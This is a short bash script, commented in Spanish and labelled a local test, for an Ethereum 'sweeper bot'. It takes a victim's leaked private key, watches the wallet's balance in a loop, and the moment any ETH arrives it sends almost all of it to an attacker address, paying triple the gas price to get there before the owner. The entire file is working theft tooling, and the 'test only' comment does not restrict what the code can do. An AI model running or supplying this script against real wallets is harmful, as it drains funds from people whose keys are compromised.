#!/usr/bin/env bash
# Sweeper bot de PRUEBA (solo red local anvil). Barre todo ETH que llegue a la victima.
# Uso: sweeper_bot.sh <RPC> <VICTIM_PK> <ATTACKER_ADDR> <LOG>
export PATH=$HOME/.foundry/bin:$PATH
RPC=$1; VPK=$2; ATT=$3; LOG=${4:-/tmp/sweeper.log}
VICTIM=$(cast wallet address --private-key $VPK)
echo "sweeper start victim=$VICTIM attacker=$ATT" >> $LOG
while true; do
  BAL=$(cast balance $VICTIM --rpc-url $RPC 2>/dev/null || echo 0)
  if [ "$BAL" != "0" ]; then
    GP=$(( $(cast gas-price --rpc-url $RPC) * 3 ))
    COST=$(( GP * 21000 ))
    if [ "$BAL" -gt "$COST" ] 2>/dev/null; then
      AMT=$(( BAL - COST ))
      if cast send $ATT --value $AMT --gas-limit 21000 --gas-price $GP --legacy --private-key $VPK --rpc-url $RPC >/dev/null 2>&1; then
        echo "$(date +%T.%N) SWEPT $AMT wei bal_was=$BAL" >> $LOG
      fi
    fi
  fi
  sleep 0.1
done
